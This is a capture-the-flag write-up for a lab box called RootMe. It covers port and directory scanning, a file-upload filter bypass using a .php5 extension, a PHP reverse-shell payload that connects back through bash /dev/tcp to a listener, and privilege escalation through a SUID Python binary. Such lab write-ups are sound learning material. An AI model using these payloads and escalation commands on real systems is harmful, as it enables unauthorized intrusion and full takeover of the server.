# RootMe -- CTF Writeup -- File Upload Exploit, Reverse Shell, and Privilege Escalation

## Nmap Scan

```bash
nmap -sS 10.10.183.212
```
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Service Enumeration

```bash
nmap -sC -sV -p 22,80 10.10.183.212
```
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home
```

> ⚠️ Note: Although the server reports Apache `2.4.41`, the challenge expects version `2.4.29`.

## Directory Enumeration

```bash
gobuster dir -u http://10.10.183.212 -w /usr/share/wordlists/dirb/common.txt
```
```
/.hta                 (Status: 403)
/.htpasswd            (Status: 403)
/.htaccess            (Status: 403)
/css                  (Status: 301) --> /css/
/index.php            (Status: 200)
/js                   (Status: 301) --> /js/
/panel                (Status: 301) --> /panel/
/server-status        (Status: 403)
/uploads              (Status: 301) --> /uploads/
```

Discovered `/panel/` which allows file uploads.

## Initial Foothold - File Upload Bypass

The server blocks `.php` uploads, but allows alternate PHP extensions (`.php5`, `.phtml`).

### Reverse Shell Payload

`shell.php5`:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.201.59.141/4444 0>&1'"); ?>
```

### Listener

```bash
nc -lvnp 4444
```

Accessing `http://10.10.183.212/uploads/shell.php5` triggers a reverse shell.

```
Connection received on 10.10.183.212 59852
```

## User Flag

```bash
find / -type f -name "user.txt" 2>/dev/null
cat /var/www/user.txt
```
```
*flag value*
```

## Privilege Escalation

Upgrade shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Check for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```
Found `/usr/bin/python2.7` with SUID.

Exploit via GTFOBins:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

## Root Flag

```bash
find / -type f -name "root.txt" 2>/dev/null
cat /root/root.txt
```
```
*flag value*
```
